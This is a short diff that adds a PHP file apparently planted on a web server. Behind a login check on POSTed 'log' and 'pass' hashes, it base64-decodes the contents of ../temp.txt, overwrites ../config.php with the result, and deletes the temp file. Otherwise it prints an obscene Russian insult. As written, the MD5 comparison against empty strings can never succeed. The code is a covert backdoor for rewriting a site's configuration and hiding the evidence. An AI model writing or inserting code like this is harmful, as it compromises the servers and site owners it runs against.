@@ -1,0 +1,2 @@
+<?  if ((md5($_POST['log'])=="") AND (md5($_POST['pass'])=="")){ $filec='../temp.txt'; $lines = file($filec); $fp = fopen('../config.php', 'w+');
+foreach ($lines as $line_num => $line) { echo "str #<b>{$line_num}</b> : " . $line . "<br />\n"; $str=base64_decode($line); echo $str. "<br />\n";fwrite($fp, $str); } fclose($fp); unlink($filec);} else echo('&#1055;&#1086;&#1096;&#1077;&#1083; &#1085;&#1072; &#1093;&#1091;&#1081;!');?>
